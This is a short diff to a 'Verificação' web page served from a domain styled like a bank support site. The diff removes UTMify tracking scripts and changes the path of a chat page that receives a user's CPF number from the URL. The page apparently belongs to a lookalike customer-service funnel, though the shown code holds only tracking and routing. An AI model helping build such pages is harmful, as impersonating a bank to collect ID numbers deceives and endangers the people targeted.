@@ -7,21 +7,7 @@
   <title>Verificação</title>
   <link rel="icon" href="https://nu-atendimento.site/favicon.ico" type="image/x-icon" sizes="256x256">
   <script src="https://cdn.tailwindcss.com/"></script>
-  <script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
-<script>
-  window.pixelId = "673cd18ac1a87f0eeb7b11d4";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
+
   <style>
     /* Removendo as definições de fonte Inter */
 
@@ -167,7 +153,7 @@
         const cpf = urlParams.get('cpf') || '';
 
         // Criar a URL para a página de chat
-        const chatUrl = new URL('/consult/chat', window.location.origin);
+        const chatUrl = new URL('../chat', window.location.origin);
 
         // Adicionar CPF à URL
         if (cpf) {
